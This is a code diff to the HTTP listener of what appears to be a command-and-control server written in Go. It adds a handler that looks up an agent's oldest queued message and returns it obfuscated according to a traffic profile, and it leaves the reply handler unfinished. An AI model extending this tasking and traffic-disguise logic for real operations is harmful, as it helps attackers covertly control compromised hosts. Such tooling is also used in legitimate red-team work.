@@ -1,9 +1,8 @@
 package listeners
 
 import (
+	"c2/repos"
 	"common/profiles"
-	"errors"
-	"fmt"
 	"log"
 	"net/http"
 	"strings"
@@ -28,23 +27,27 @@ func getLatestMessage(req *profiles.ProfileRequest) (handler func(w http.Respons
 		if maybeAbort(err, r) {
 			return
 		}
-
 		agentID, err := profiles.OperateDataReverseOperations(&req.ID.Operations, &obfuscatedAgentID, false)
 		if maybeAbort(err, r) {
 			return
 		}
 
-		obfuscatedData, err := extractPlacement(&req.Payload.Placement, r)
-		if !errors.Is(err, ErrPlacementUnspecified) && maybeAbort(err, r) {
+		message, err := repos.GetOldestMessageForAgent(agentID)
+		if /*!errors.Is(err, gorm.ErrRecordNotFound) && */ maybeAbort(err, r) {
 			return
 		}
 
-		payload, err := profiles.OperateDataReverseOperations(&req.Payload.Operations, &obfuscatedData, false)
+		obfuscatedResponse, err := profiles.OperateData(&req.Payload.Response.Operations, &message.Request, true)
 		if maybeAbort(err, r) {
 			return
 		}
 
-		fmt.Println(agentID, "\n", payload)
+		if req.Payload.Response.StatusCode > 0 {
+			w.WriteHeader(req.Payload.Response.StatusCode)
+		}
+		w.Write([]byte(obfuscatedResponse))
+
+		// fmt.Println(agentID, "\n", payload)
 	}
 
 }
@@ -52,6 +55,15 @@ func getLatestMessage(req *profiles.ProfileRequest) (handler func(w http.Respons
 func respondToMessage(profile *profiles.ProfileRequest) (handler func(w http.ResponseWriter, r *http.Request)) {
 	return func(w http.ResponseWriter, r *http.Request) {
 		// TODO
+
+		// obfuscatedData, err := extractPlacement(&req.Payload.Placement, r)
+		// if !errors.Is(err, ErrPlacementUnspecified) && maybeAbort(err, r) {
+		// 	return
+		// }
+		// payload, err := profiles.OperateDataReverseOperations(&req.Payload.Operations, &obfuscatedData, false)
+		// if maybeAbort(err, r) {
+		// 	return
+		// }
 	}
 }
 
